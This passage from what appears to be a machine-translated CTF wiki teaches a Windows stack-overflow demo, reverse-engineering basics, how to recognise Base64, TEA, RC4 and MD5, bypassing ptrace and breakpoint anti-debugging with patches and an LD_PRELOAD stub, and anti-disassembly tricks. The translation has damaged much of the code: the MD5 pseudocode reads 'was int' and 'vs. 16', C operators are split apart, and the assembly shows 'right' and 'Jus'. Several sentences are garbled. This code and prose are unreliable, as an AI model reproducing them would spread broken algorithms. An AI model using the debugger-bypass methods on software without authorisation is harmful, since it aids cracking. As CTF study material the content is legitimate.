protection that was opened. It can be seen that GS is turned on, but this does not hinder our overflow.</p> <pre><code>C:\\Users\\CarlStar\\Desktop&gt;winchecksec.exe demo1.exe\n\nDynamic Base    : false\n\nASLR            : true\n\nHigh Entropy VA : false\n\nForce Integrity : false\n\nIsolation       : true\n\nNX              : true\n\nSEH: true\nCFG             : false\n\nRFG             : false\n\nSafeSEH         : true\n\nGS              : true\n\nAuthenticode    : false\n\n.NET            : true\n</code></pre> <p>Use OllyDbg to dynamically debug this program, enter aaaaaa and see the normal execution flow of the program. To make it easier to understand the whole process, the next breakpoint is executed after the strcmp function and strcpy are executed.</p> <p></p> <p>Now let the program run, after entering aaaaaa, the program will execute to the first breakpoint under us. Go to the strcmp function and observe its return value. Because the ascii code value of a is greater than the ascii code value of 6, no unexpected function will return 1, the return value under x86 is saved in the EAX register, after the function returns normally, the rest of the function will be used because the program completes it. These registers, so this return value will be stored on the stack, which is ss:[0012FEA0].</p> <p></p> <p>! [demo3] (./ figure / demo1-3.png)</p> <p>When executing to the second breakpoint, look at the stack structure. Where 61 is the ascii code form we entered a, and 00 is the string terminator. Then the size of buffer is 8 bytes. If we enter 8 a, the last string terminator will overflow to 0012FEA0. This position overwrites the original value to 0, so we can change The execution flow of the program, output Congratulation! You have passed the verification!</p> <pre><code>0012FE90   CCCCCCCC\n\n0012FE94   CCCCCCCC\n\n0012FE98   61616161\n\n0012FE9C   CC006161\n\n0012FEA0   00000001\n</code></pre> <p>Ok, let's let the program run normally.</p> <p></p> <p>This time we enter 8 a to verify if we think the same: ** The end of the string will overflow to the return value of strcmp**. You can see that the return value of strcmp is still 1.</p> <p></p> <p>Continue to the second breakpoint and look at the current stack value. The return value of strcmp has been successfully overflowed from 1 to 0 .</p> <pre><code>0012FE90   CCCCCCCC\n\n0012FE94   CCCCCCCC\n\n0012FE98   61616161\n\n0012FE9C   61616161\n\n0012FEA0   00000000\n</code></pre> <p>At this time, let the program continue to run, and successfully output the expected string.</p> <p></p>"},{"location":"pwn/windows/stackoverflow/stackoverflow-basic/#reference-reading","title":"Reference reading","text":"<p>stack buffer overflow</p> <p>[0day security: software vulnerability analysis technology] ()</p> <p>Winchecksec</p>"},{"location":"reverse/introduction/","title":"Software Reverse Engineering Introduction","text":""},{"location":"reverse/introduction/#definition","title":"definition","text":"<p>Reverse engineering, also called back engineering, is the process by which a man-made object is deconstructed to reveal its designs, architecture, or to extract knowledge from the object;       ------  from wikipedia</p> <p>Software code reversal mainly refers to reverse disassembly and analysis of software structure, process, algorithm, code, etc.</p>"},{"location":"reverse/introduction/#application-area","title":"Application area","text":"<p>Mainly used in software maintenance, software cracking, vulnerability mining, malicious code analysis.</p>"},{"location":"reverse/introduction/#reverse-in-the-ctf-competition","title":"Reverse in the CTF competition","text":"<p>&gt; A variety of programming technologies involving Windows, Linux, and Android platforms require reverse analysis of source code and binary files using common tools, mastering the reverse analysis of Android mobile application APK files, mastering encryption and decryption, kernel programming, algorithms, anti-debugging, and Code obfuscation technology. &gt; ------ \"National College Student Information Security Competition Entry Guide\"</p>"},{"location":"reverse/introduction/#claim","title":"Claim","text":"<ul> <li>Familiar with related knowledge such as operating system, assembly language, encryption and decryption</li> <li>Experience in programming with a variety of high-level languages</li> <li>Familiar with the compiler principle of multiple compilers</li> <li>Strong program understanding and reverse analysis capabilities</li> </ul>"},{"location":"reverse/introduction/#regular-reverse-process","title":"Regular reverse process","text":"<ol> <li>Collect information using static analysis tools such as <code>strings/file/binwalk/IDA</code> and perform a <code>google/github</code> search based on these static information.</li> <li>Study the protection methods of the program, such as code obfuscation, protective shell and anti-debugging techniques, and try to break or bypass protection</li> <li>Disassemble the target software and quickly locate the key code for analysis</li> <li>Combine dynamic debugging, verify your initial guess, and clarify the program function during the analysis process.</li> <li>For the program function, write the corresponding script to solve the flag</li> </ol>"},{"location":"reverse/introduction/#positioning-key-code-tips","title":"Positioning key code tips","text":"<p>Analyze control flow</p> <p>The control flow can be seen in the Control Flow Chart (CFG) generated by IDA. The disassembly code is read block by block along the branch loop and function call.</p> <ol> <li>Using data, code cross-references</li> </ol> <p>For example, the output prompt string can be found through the data cross-reference to find the corresponding call location, and then find the key code. Code cross-references such as graphical interface programs to get user input, you can use the corresponding windowsAPI function, we can find the key code through these API function call location.</p>"},{"location":"reverse/introduction/#reverse-tips","title":"Reverse tips","text":"<p>Coding style</p> <p>Each programmer's coding style is different. Students who are familiar with the development design pattern can analyze the function module function more quickly.</p> <ol> <li>Principle of concentration</li> </ol> <p>When programmers develop programs, they are often used to write function-related code or data in the same place, and this can be shown in disassembled code, so you can view functions and data near key code during analysis.</p> <ol> <li>Code reuse</li> </ol> <p>Code reuse is very common, and Github, the largest source code repository, is the primary source. In the analysis, you can find some features (such as strings, code styles, etc.) to search on Github, you may find similar code, and recover the missing symbol information during analysis.</p> <ol> <li>Seven points reverse three-point guess</li> </ol> <p>Reasonable guessing can often get twice the result with half the effort. If you encounter a suspicious function but can't see the logic inside, you can guess the function according to the clues and continue to analyze it according to the guess. In the constant guessing, it may help you get closer to the code. The truth.</p> <ol> <li>Distinguishing code</li> </ol> <p>To get the disassembly code, you must be able to distinguish which code is written manually and which is automatically appended by the compiler. In the code written by man, what are the library function codes, which are the code written by the questioner himself, and how is the code of the questioner optimized by the compiler? It is important that we don't have to spend time on code outside of the issuer. If you analyze the half-day in the library function, it will not only experience very bad results, but also have no effect.</p> <ol> <li>Patience</li> </ol> <p>In any case, given enough time, you can always analyze a program thoroughly. But it should not be abandoned too early. I believe that I can definitely break through the problem in the process of twitching and stripping.</p>"},{"location":"reverse/introduction/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The purpose of dynamic analysis is to locate the key code and verify its inference or understand the program function by outputting information (register, memory change, program output) during the running of the program.</p> <p>The main methods are: debugging, symbol execution, stain analysis</p>"},{"location":"reverse/introduction/#algorithm-and-data-structure-identification","title":"Algorithm and data structure identification","text":"<ul> <li>Common algorithm identification</li> </ul> <p>Such as <code>Tea/XTea/XXTea/IDEA/RC4/RC5/RC6/AES/DES/IDEA/MD5/SHA256/SHA1</code> and other encryption algorithms, large number addition, subtraction, multiplication and division, shortest path and other traditional algorithms</p> <ul> <li>Common data structure identification</li> </ul> <p>The identification of advanced data structures such as diagrams, trees, and hash tables in assembly code.</p>"},{"location":"reverse/introduction/#code-obfuscation","title":"Code obfuscation","text":"<p>For example, using tools such as <code>OLLVM</code>, <code>movfuscator</code>, <code>flower instruction</code>, <code>virtualization</code> and <code>SMC</code> to confuse the code makes program analysis very difficult.</p> <p>Then there is also anti-aliasing technology, the main purpose is to restore the control flow. Such as <code>simulation execution</code> and <code>symbol execution</code></p>"},{"location":"reverse/introduction/#protective-shell","title":"Protective shell","text":"<p>There are many types of protective shells, and simple compressed shells can be classified into the following types.</p> <ul> <li>unpack -&gt; execute</li> </ul> <p>Extract the program code directly into memory and continue executing the program code.</p> <ul> <li>unpack -&gt; execute -&gt; unpack -&gt; execute ...</li> </ul> <p>Unzip part of the code and execute it while decompressing</p> <ul> <li>unpack -&gt; [decoder | encoded code] -&gt; decode -&gt; execute</li> </ul> <p>The program code has been coded, and after decompressing, the function is executed to decode the real program code.</p> <p>There are also related methods for shelling, such as <code>single stepping method</code>, `ESP law', etc.</p>"},{"location":"reverse/introduction/#debug","title":"\u53cdDebug","text":"<p>Anti-debugging is intended to prevent the program from being debugged and analyzed by means such as detecting the debugger. For example, use some API functions such as <code>IsDebuggerPresent</code> to detect the debugger, use <code>SEH exception handling</code>, time difference detection and other methods. It can also be protected by overwriting the debug port, self-tuning, and so on.</p>"},{"location":"reverse/introduction/#unconventional-reverse-thinking","title":"Unconventional reverse thinking","text":"<p>Unconventional reverse problem design has a wide range of topics and can be any format file of any architecture.</p> <ul> <li> <p>lua/python/java/lua-jit/haskell/applescript/js/solidity/webassembly/etc..</p> </li> <li> <p>firmware/raw bin/etc..</p> </li> <li> <p>chip8/avr/clemency/risc-v/etc.</p> </li> </ul> <p>However, the method of reverse engineering is not afraid of these unknown platform formats. In the case of such unconventional problems, we also have some basic processes that can be used universally.</p>"},{"location":"reverse/introduction/#pre-preparation","title":"Pre-preparation","text":"<ul> <li>Read the documentation. The quick way to learn the platform language is to read the official documentation.</li> <li>Official tools. The tools provided or recommended by the government are necessarily the most appropriate tools.</li> <li>Tutorial. On the reverse side, there may be many seniors who wrote reverse tutorials specific to the platform language, so they can quickly absorb this knowledge.</li> </ul>"},{"location":"reverse/introduction/#looking-for-tools","title":"Looking for tools","text":"<p>Mainly look for <code>file parsing tools</code>, <code>disassembler</code>, <code>debugger</code> and <code>decompiler</code>. The <code>disassembler&amp;#39; is required, the</code>debugger<code>also contains the corresponding disassembly function, and for the</code>decompiler', you have to ask for more blessings, and I am fortunate to lose my life.</p> <p>Looking for tools to sum up is: Google Dafa is good. Using Google search grammar reasonably, keyword search can help you find the right tool faster and better.</p>"},{"location":"reverse/Identify-Encode-Encryption/introduction/","title":"Common Encryption Algorithms and Code Recognition","text":""},{"location":"reverse/Identify-Encode-Encryption/introduction/#foreword","title":"Foreword","text":"<p>In the process of transforming data, in addition to simple byte operations, some common encoding and encryption algorithms are used, so if the corresponding encoding or encryption algorithm can be quickly identified, the entire integrity can be analyzed more quickly. Algorithm. Encryption algorithms commonly found in CTF reversals include base64, TEA, AES, RC4, MD5, and so on.</p>"},{"location":"reverse/Identify-Encode-Encryption/introduction/#base64","title":"Base64","text":"<p>Base64 is a representation of binary data based on 64 printable characters. When converting, put 3 bytes of data into a 24-bit buffer, and the first byte occupies the high position. If the data is less than 3 bytes, the remaining bits in the buffer are complemented by 0. Take 6 bits each time (because), select by value <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ The characters in</code> are used as encoded output until all input data conversion is completed.</p> <p>In general, the recognition feature of Base64 is the index table. When we can find the index table of <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>, we can basically determine the Base64 encoding through simple analysis.</p> <p></p> <p>Of course, some index base64 index tables will change, some variants of base64 mainly modify the index table.</p>"},{"location":"reverse/Identify-Encode-Encryption/introduction/#tea","title":"Tea","text":"<p>In [Cryptography] (https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A0%81%E5%AD%A6), Micro Encryption Algorithm , TEA) is an easy to describe and [execute] (https://zh.wikipedia.org/w/index.php?title=%E6%89%A7%E8%A1%8C&amp;action=edit&amp;redlink=1) Block password] (https://zh.wikipedia.org/wiki/%E5%A1%8A%E5%AF%86%E7%A2%BC), usually only requires a small amount of code to achieve. The designer is [Cambridge University Computer Lab] (https://en.wikipedia.org/wiki/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6) [David Wheeler] (https://en.wikipedia.org/w/index.php?title=%E5%A4%A7%E5%8D%AB%C2%B7%E6%83%A0%E5 %8B%92&amp;action=edit&amp;redlink=1) with [Roger Niddam] (https://en.wikipedia.org/w/index.php?title=%E7%BD%97%E6%9D%B0% C2%B7%E5%B0%BC%E8%BE%BE%E5%A7%86&amp;action=edit&amp;redlink=1).</p> <p>Reference Code:</p> <pre><code>#include &lt;stdint.h&gt;\n\n\n\nvoid encrypt (uint32_t* v, uint32_t* k) {\n\n    uint32_t v0=v[0], v1=v[1], sum=0, i;           /* set up */\n\n    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */\n\nuint32_t k0 = k [0], k1 = k [1], k2 = k [2], k3 = k [3]; / * cache key * /\n    for (i=0; i &lt; 32; i++) {                       /* basic cycle start */\n\nsum + = delta;\nv0 + = ((v1 &amp;lt;&amp;lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &amp;gt;&amp;gt; 5) + k1);\nv1 + = ((v0 &amp;lt;&amp;lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &amp;gt;&amp;gt; 5) + k3);\n    }                                              /* end cycle */\n\nv [0] = v0; v [1] = v1;\n}\n\n\n\nvoid decrypt (uint32_t* v, uint32_t* k) {\n\nuint32_t v0 = v [0], v1 = v [1], sum = 0xC6EF3720, i; / * set up * /\n    uint32_t delta=0x9e3779b9;                     /* a key schedule constant */\n\nuint32_t k0 = k [0], k1 = k [1], k2 = k [2], k3 = k [3]; / * cache key * /\n    for (i=0; i&lt;32; i++) {                         /* basic cycle start */\n\nv1 - = ((v0 &amp;lt;&amp;lt; 4) + k2) ^ (v0 + sum) ^ ((v0 &amp;gt;&amp;gt; 5) + k3);\nv0 - = ((v1 &amp;lt;&amp;lt; 4) + k0) ^ (v1 + sum) ^ ((v1 &amp;gt;&amp;gt; 5) + k1);\nsum - = delta;\n    }                                              /* end cycle */\n\nv [0] = v0; v [1] = v1;\n}\n</code></pre> <p>The main recognition feature in the Tea algorithm is to have an image number : 0x9e3779b9 . Of course, this Tea algorithm also has a magic change, interested can see 2018 0ctf Quals milk-tea.</p>"},{"location":"reverse/Identify-Encode-Encryption/introduction/#rc4","title":"RC4","text":"<p>In [Cryptography] (https://zh.wikipedia.org/wiki/%E5%AF%86%E7%A2%BC%E5%AD%B8), RC4 (from Rivest Cipher 4 Abbreviation) is a [stream encryption] (https://zh.wikipedia.org/wiki/%E6%B5%81%E5%8A%A0%E5%AF%86) algorithm, [key] (https: //zh.wikipedia.org/wiki/%E5%AF%86%E9%92%A5) Variable length. It uses the same key for encryption and decryption, so it also belongs to [symmetric encryption algorithm] (https://zh.wikipedia.org/wiki/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5 %AF%86). RC4 is [Wired Equivalent Encryption] (https://en.wikipedia.org/wiki/%E6%9C%89%E7%B7%9A%E7%AD%89%E6%95%88%E5%8A% The encryption algorithm used in A0%E5%AF%86) (WEP) was also [TLS] (https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E5 %B1%82%E5%AE%89%E5%85%A8%E5%8D%8F%E8%AE%AE) One of the algorithms that can be used.</p> <pre><code>Void rc4_init(unsigned char *s, unsigned char *key, unsigned long Len) //Initialization function\n{\n\n    int i =0, j = 0;\n\nchar k [256] = {0};\n    unsigned char tmp = 0;\n\n    for (i=0;i&lt;256;i++) {\n\n        s[i] = i;\n\nk [i] = key [i% Len];\n    }\n\n    for (i=0; i&lt;256; i++) {\n\n        j=(j+s[i]+k[i])%256;\n\n        tmp = s[i];\n\ns[i] = s[j]; //exchange s[i] and s[j]\n        s[j] = tmp;\n\n    }\n\n }\n\n\n\nvoid rc4_crypt(unsigned char *s, unsigned char *Data, unsigned long Len) //\u52a0\u89e3\u5bc6\n\n{\n\n    int i = 0, j = 0, t = 0;\n\n    unsigned long k = 0;\n\n    unsigned char tmp;\n\n    for(k=0;k&lt;Len;k++) {\n\n        i=(i+1)%256;\n\n        j=(j+s[i])%256;\n\n        tmp = s[i];\n\ns[i] = s[j]; // swap s[x] and s[y]\n        s[j] = tmp;\n\n        t=(s[i]+s[j])%256;\n\n        Data[k] ^= s[t];\n\n     }\n\n} \n</code></pre> <p>By analyzing the initialization code, it can be seen that in the initialization code, the character array s is initialized and assigned, and the assignment values are incremented. Then 256 exchange operations were performed on s. The rc4 algorithm can be known by identifying the initialization code.</p> <p>Its pseudo code is expressed as:</p> <p>Initialize [S box] with a length of 256 (https://zh.wikipedia.org/wiki/S%E7%9B%92). The first for loop loads 0 to 255 non-repeating elements into the S box. The second for loop scrambles the S box based on the key.</p> <pre><code>  for i from 0 to 255\n\n     S[i] := i\n\n endfor\n\n j := 0\n\n for( i=0 ; i&lt;256 ; i++)\n\n     j := (j + S[i] + key[i mod keylength]) % 256\n\n     swap values of S[i] and S[j]\n\n endfor\n</code></pre> <p>Below i, j are two pointers. Each time a byte is received, a while loop is performed. An element in the S box is located by a certain algorithm ((a), (b)) and XORed with the input byte to obtain k. The S box (\u00a9) is also changed in the loop. If the input is [plain text] (https://zh.wikipedia.org/wiki/%E6%98%8E%E6%96%87), the output is [ciphertext] (https://zh.wikipedia. Org/wiki/%E5%AF%86%E6%96%87); if the input is ciphertext, the output is plaintext.</p> <pre><code> i := 0\n\n j := 0\n\n while GeneratingOutput:\n\n     i := (i + 1) mod 256   //a\n\n     j := (j + S[i]) mod 256 //b\n\n     swap values of S[i] and S[j]  //c\n\n     k := inputByte ^ S[(S[i] + S[j]) % 256]\n\n     output K\n\n endwhile\n</code></pre> <p>This algorithm guarantees that each element of the S box is exchanged at least once every 256 cycles.</p>"},{"location":"reverse/Identify-Encode-Encryption/introduction/#md5","title":"MD5","text":"<p>MD5 Message-Digest Algorithm, a widely used [cryptographic hash function] (https://en.wikipedia.org/wiki/%E5%AF%86%) E7%A2%BC%E9%9B%9C%E6%B9%8A%E5%87%BD%E6%95%B8), can produce a 128-bit (16 [bytes] (https://zh. wikipedia.org/wiki/%E5%AD%97%E8%8A%82)) The hash value used to ensure complete and consistent information transfer. MD5 by American cryptographer [Ronald Levist] (https://en.wikipedia.org/wiki/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7% E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9) (Ronald Linn Rivest) designed to be published in 1992 to replace [MD4] (https://en.wikipedia .org/wiki/MD4) algorithm. The program for this algorithm is specified in [RFC 1321] (https://tools.ietf.org/html/rfc1321).</p> <p>The pseudo code is expressed as:</p> <pre><code>/Note: All variables are unsigned 32 bits and wrap modulo 2^32 when calculating\n\nwas int [64] r, k\n\n\n//r specifies the per-round shift amounts\n\nr[ 0..15]\uff1a= {7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22,  7, 12, 17, 22} \n\nr[16..31]\uff1a= {5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20,  5,  9, 14, 20}\n\nr[32..47]\uff1a= {4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23,  4, 11, 16, 23}\n\nr[48..63]\uff1a= {6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21,  6, 10, 15, 21}\n\n\n\n//Use binary integer part of the sines of integers as constants:\n\nfor i from 0 to 63\n\n    k[i] := floor(abs(sin(i + 1)) \u00d7 2^32)\n\n\n\n//Initialize variables:\n\nwas int h0: = 0x67452301\nwas int h1: = 0xEFCDAB89\nwas int h2: = 0x98BADCFE\nwas int h3: = 0x10325476\n\n\n//Pre-processing:\n\nappend \"1\" bit to message\n\nappend \"0\" bits until message length in bits \u2261 448 (mod 512)\n\nappend bit length of message as 64-bit little-endian integer to message\n\n\n\n//Process the message in successive 512-bit chunks:\n\nfor each 512-bit chunk of message\n\n    break chunk into sixteen 32-bit little-endian words w[i], 0 \u2264 i \u2264 15\n\n\n\n    //Initialize hash value for this chunk:\n\nvar int a: = h0\nwas int b: = h1\nwas int c: = h2\nvar int d: = h3\n\n\n    //Main loop:\n\n    for i from 0 to 63\n\n        if 0 \u2264 i \u2264 15 then\n\n            f := (b and c) or ((not b) and d)\n\ng: = i\n        else if 16 \u2264 i \u2264 31\n\n            f := (d and b) or ((not d) and c)\n\ng: = (5 \u00d7 i + 1) vs. 16\n        else if 32 \u2264 i \u2264 47\n\n            f := b xor c xor d\n\ng: = (3 \u00d7 i + 5) vs. 16\n        else if 48 \u2264 i \u2264 63\n\n            f := c xor (b or (not d))\n\ng: = (7 \u00d7 i) vs. 16\n\n\n        temp := d\n\n        d := c\n\n        c := b\n\n        b := leftrotate((a + f + k[i] + w[g]),r[i]) + b\n\n        a := temp\n\n    Next i\n\n    //Add this chunk's hash to result so far:\n\n    h0 := h0 + a\n\nh1: = h1 + b\n    h2 := h2 + c\n\n    h3 := h3 + d\n\nEnd ForEach\n\nvar int digest := h0 append h1 append h2 append h3 //(expressed as little-endian)\n</code></pre> <p>Its distinctive features are:</p> <pre><code>    h0 = 0x67452301;\n\n    h1 = 0xefcdab89;\n\n    h2 = 0x98badcfe;\n\n    h3 = 0x10325476;\n</code></pre>"},{"location":"reverse/linux/detect-bp/","title":"Detecting Breakpoints Bypassing","text":"<p>Gdb implements a breakpoint by replacing the byte of the destination address with <code>0xcc</code>. Here is a simple example of detecting the <code>int 3</code> breakpoint:</p> <pre><code>void foo() {\n\n    printf(\"Hello\\n\");\n\n}\n\nint main() {\n\n    if ((*(volatile unsigned *)((unsigned)foo) &amp; 0xff) == 0xcc) {\n\n        printf(\"BREAKPOINT\\n\");\n\n        exit(1);\n\n    }\n\n    foo();\n\n}\n</code></pre> <p>The normal running program will output Hello, but if you set the <code>cc</code> breakpoint and run it in the <code>foo</code> function, gdb will not be able to break, and will output <code>BREAKPOINT</code>.</p> <pre><code># gdb ./x\n\ngdb&gt; bp foo\n\nBreakpoint 1 at 0x804838c\n\ngdb&gt; run\n\nBREAKPOINT\n\nProgram exited with code 01.\n</code></pre> <p>This is also very simple to bypass, that is, you need to read the assembly code and pay attention to set the breakpoint not at the entrance of the <code>foo</code> function. The actual situation depends on where the detection breakpoint is.</p> <p>The key to this anti-debugging technique for monitoring breakpoints is not how to bypass it, but how to detect it. In this example, it is easy to find that the program also prints out the corresponding information. In actual situations, the program does not Any information will be output, and the breakpoint will not be easily broken. We can use the <code>perl</code> script to filter the code for the <code>0xcc</code> in the disassembly code for checking.</p> <p>We can use the perl script to filter the 0xcc code in the disassembly code for checking.</p> <pre><code>#!/usr/bin/perl\n\nwhile(&lt;&gt;)\n\n{\n\n    if($_ =~ m/([0-9a-f][4]:\\s*[0-9a-f \\t]*.*0xcc)/ ){ print; }\n\n}\n</code></pre> <p>show result</p> <pre><code># objdump -M intel -d xxx | ./antibp.pl\n\n      80483be: 3d cc 00 00 00 cmp eax,0xcc\n</code></pre> <p>After detection, you can either change 0xcc to 0x00 or 0x90, or do whatever you want.</p> <p>Changing 0xcc can also cause problems. As mentioned in the previous article, if the program has file verification, then our changes will be detected. If possible, the program does not only detect the function entry point. The entire function is also tested in a loop.</p> <p>So you can also manually place an <code>ICEBP(0xF1)</code> byte into the location you want to break (not <code>int 3</code>) with a hex editor. Because <code>ICEBP</code> also breaks gdb.</p> <p>Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques</p>"},{"location":"reverse/linux/detect-dbg/","title":"Detecting Debugging Bypassing","text":"<p>There are many ways to detect the debugger, such as detecting the process name. Here we introduce a method to detect whether the program is currently being debugged by detecting the call of some functions.</p> <pre><code>int main()\n\n{\n\n    if (ptrace(PTRACE_TRACEME, 0, 1, 0) &lt; 0) {\n\n        printf(\"DEBUGGING... Bye\\n\");\n\n        return 1;\n\n    }\n\n    printf(\"Hello\\n\");\n\n    return 0;\n\n}\n</code></pre> <p>A process can only be ptrace by a process. If you call ptrace yourself, other programs cannot debug through ptrace or inject code into your program.</p> <p>If the program is currently being debugged by gdb, the ptrace function will return an error, which indicates that the debugger is detected.</p>"},{"location":"reverse/linux/detect-dbg/#bypass-method-1","title":"Bypass Method 1","text":"<p>Obviously ptrace can only be used with debuggers that use ptrace, we can use debuggers that don't use ptrace.</p> <p>We can also erase the ptrace function by patching. The simpler is to erase the ptrace call code or the subsequent checksum.</p> <p>If the executable (which is unlikely in the real world) does not have the -s option enabled at compile time (the -s option removes all symbol table information and relocation information), then the situation becomes much simpler. We are from this Simple situation to analyze</p> <pre><code># objdump -t test_debug | grep ptrace\n\n080482c0    F *UND*     00000075    ptrace@@GLIBC_2.0\n</code></pre> <p>Ptrace is called at <code>0x080482c0</code></p> <pre><code># objdump -d -M intel test_debug |grep 80482c0\n\n80482c0:    ff 25 04 96 04 08   jmp ds:0x8049604\n\n80483d4:    e8 e7 fe ff ff  call 80482c0 &lt;_init+0x28&gt;\n</code></pre> <p>If there is the -s option enabled, what should I do? At this point we need to use gdb</p> <pre><code># gdb test_debug\n\ngdb&gt; bp ptrace\n\nBreakpoint 1 at 0x80482c0\n\ngdb&gt; run\n\nBreakpoint 1 at 0x400e02f0\n\n......\n\n0x400e02f0 &lt;ptrace&gt;: push %ebp\n\n0x400e02f1 &lt;ptrace+1&gt;: mov %esp,%ebp\n\n0x400e02f3 &lt;ptrace+3&gt;: sub $0x10,%esp\n\n0x400e02f6 &lt;ptrace+6&gt;: mov %edi,0xfffffffc(%ebp)\n\n0x400e02f9 &lt;ptrace+9&gt;: mov 0x8(%ebp),%edi\n\n0x400e02fc &lt;ptrace+12&gt; : move 0xc (% ebp),% ecx\n------------------------------------------------------------------------------\n\nBreakpoint 1, 0x400e02f0 in ptrace () from /lib/tls/libc.so.6\n</code></pre> <p>We simply broke at ptrace, now enter finish to return to the current function, back to the main function</p> <pre><code># gdb test_debug\n\ngdb&gt; finish\n\n00x80483d9 &lt;main+29&gt;:   add $0x10,%esp\n\n0x80483dc   &lt;main+32&gt;:  test %eax,%eax\n\n0x80483de &lt;main+34&gt; : Jus 0x80483fa &lt;main+62&gt;\n0x80483e0   &lt;main+36&gt;:  sub $0xc,%esp\n\n0x80483e3   &lt;main+39&gt;:  push $0x80484e8\n\n0x80483e8   &lt;main+44&gt;:  call 0x80482e0\n\n------------------------------------------------------------------------------\n\n0x080483d9 in main ()\n</code></pre> <p>Modify the function return result eax to the correct return result, you can</p> <pre><code>gdb&gt; set $eax=0\n\ngdb&amp;gt; c\neverything ok\n\nProgram exited with code 016.\n\n_______________________________________________________________________________\n\nNo registers.\n\ngdb&gt;\n</code></pre>"},{"location":"reverse/linux/detect-dbg/#bypass-method-2","title":"Bypass Method 2","text":"<p>Method 2 is to write your own ptrace function</p> <p>As mentioned in the previous sections, the <code>LD_PRELOAD</code> environment variable can point the executable to our own ptrace function.</p> <p>We write a ptrace function and generate the target file</p> <pre><code>// -- ptrace.c --\n\n// gcc -shared ptrace.c -o ptrace.so\n\nint ptrace(int i, int j, int k, int l)\n\n{\n\n    printf(\" PTRACE CALLED!\\n\");\n\n}\n</code></pre> <p>We can then use our own ptrace function by setting the environment variable LD_PRELOAD, which can be set in gdb.</p> <pre><code>gdb&gt; set environment LD_PRELOAD ./ptrace.so\n\ngdb&gt; run\n\nPTRACE CALLED!\n\nHello World!\n\nProgram exited with code 015.\n\ngdb&gt;\n</code></pre> <p>You can see that the program can't detect the debugger.</p> <p>Reference: Beginners Guide to Basic Linux Anti Anti Debugging Techniques</p>"},{"location":"reverse/linux/false-disasm/","title":"Incorrect Disassembly Fix","text":"<p>For some common disassemblers, such as <code>objdump</code>, or disassembler projects based on <code>objdump</code>, there are some disassembly flaws. There are ways to make <code>objdump</code> disassemble the code, not so Accurate.</p>"},{"location":"reverse/linux/false-disasm/#jump-to-the-middle-of-an-instruction","title":"Jump to the middle of an instruction","text":"<p>The easiest way is to use <code>jmp</code> to jump to the middle of an instruction, that is, the real code starts from \"inside\" an instruction, but in disassembly it cannot be listed for the entire instruction. The actual assembly instruction code that is being run.</p> <p>It sounds like a mouthful, it's hard to understand, let's look at an example, give the following assembly code.</p> <pre><code>start:\n\n    jmp label+1\n\nlabel:  \n\n    DB 0x90\n\n    mov eax, 0xf001\n</code></pre> <p>The first instruction in the code <code>label</code> is <code>DB 0x90</code>. Let's take a look at the result of disassembly of this code by <code>objdump</code>:</p> <pre><code>08048080 &lt;start&gt;:\n\n8048080: e9 01 00 00 00 jmp 8048086 &lt;label+0x1&gt;\n08048085 &lt;label&gt;:\n\n8048085: 90 nop\n  8048086:  b8 01 f0 00 00  mov eax,0xf001\n</code></pre> <p>It seems that there is no problem, <code>DB 0x90</code> is accurately disassembled into <code>90 nop</code>.</p> <p>But if we change the <code>nop</code> instruction to a command of more than 1 byte, then objdump will not follow our jump and correctly disassemble, but linearly continue to assemble from top to bottom (linear scan algorithm). For example, I Change <code>DB 0x90</code> to <code>DB 0xE9</code> to see the result of objdump disassembling again:</p> <pre><code>08048080 &lt;start&gt;:\n\n8048080: e9 01 00 00 00 jmp 8048086 &lt;label+0x1&gt;\n08048085 &lt;label&gt;:\n\n  8048085:  e9 b8 01 f0 00  jmp 8f48242 &lt;__bss_start+0xeff1b6&gt;\n</code></pre> <p>Compared with the previous disassembly results, you can clearly see what is going on. <code>DB 0xE9</code> is just a piece of data, it will not be executed, but the result of disassembly will be treated as an instruction. The result has also changed.</p> <p>Objdump` ignores the code at the destination address of jmp and directly assembles the instructions after jmp, so that our real code is well \"hidden\"</p>"},{"location":"reverse/linux/false-disasm/#solution","title":"Solution","text":"<p>How to solve this problem? The most straightforward way is to manually replace this useless <code>0xE9</code> with a hex editor with <code>0x90</code>. But if the program has file checksum, calculate the checksum value, then this The method will not work.</p> <p>So a better solution is to use a disassembler such as IDA or similar control flow analysis, for programs that are also problematic. The disassembly results might look like this:</p> <pre><code>  ---- section .text ----:\n\n08048080    E9 01 00 00 00  jmp Label_08048086\n\n                                                ; (08048086)\n\n                                                ; (near + 0x1)\n\n08048085    DB E9\n\n\n\nLabel_08048086:\n\n08048086    B8 01 F0 00 00  mov eax, 0xF001\n\n                                                ; xref ( 08048080 ) \n</code></pre> <p>Disassembly results look okay</p>"},{"location":"reverse/linux/false-disasm/#run-time-calculation-jump-address","title":"Run time calculation jump address","text":"<p>This method can even counter the disassembler of the analysis control flow. We can look at a sample code to better understand:</p> <pre><code>; ----------------------------------------------------------------------------\n\n    call earth+1\n\nReturn:\n\n                    ; x instructions or random bytes here               x byte(s)\n\nearth:              ; earth = Return + x\n\n    xor eax, eax    ; align disassembly, using single byte opcode       1 byte\n\n    pop eax         ; start of function: get return address ( Return )  1 byte\n\n                    ; y instructions or random bytes here               y byte(s)\n\n    add eax, x+2+y+2+1+1+z ; x+y+z+6                                    2 bytes\n\n    push eax        ;                                                   1 byte\n\nright ; 1 byte\n                    ; z instructions or random bytes here               z byte(s)\n\n; Code:\n\n                    ; !! Code Continues Here !!\n\n; ----------------------------------------------------------------------------\n</code></pre> <p>The program uses <code>call+pop</code> to get the return address that the calling function saved to the stack at the time. It is actually the <code>EIP</code> before the function is called. Then the garbage data is stuffed at the function return. But it will actually return when the function is running. The address is modified to Code. So the 